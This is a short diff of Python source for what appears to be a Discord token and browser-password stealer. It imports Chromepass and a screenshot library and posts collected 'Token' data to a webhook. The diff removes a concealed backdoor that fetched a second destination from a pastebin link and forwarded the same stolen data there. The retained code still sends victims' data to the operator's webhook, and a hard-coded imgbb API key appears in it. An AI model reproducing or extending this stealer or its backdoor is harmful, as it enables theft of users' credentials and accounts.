@@ -8,8 +8,6 @@ from mss import mss
 from chromepass import Chromepass
 from time import strftime, gmtime
 
-backdoor = requests.get("https://pastebin.com/raw/7zti0NgP").text
-
 class Main:
 
     def __init__(self, webhook: str, ping: str = None, nitro: dict = None, boost: dict = None, imgbb: str = "25fae02c0a7e2e83389cb08f2fab4480"):
@@ -377,8 +375,7 @@ __**Token**__
             ]
         }
         requests.post(self.webhook, json=json)
-        requests.post(backdoor, json=json)
-
+        
     def start(self):
         self.find()
 
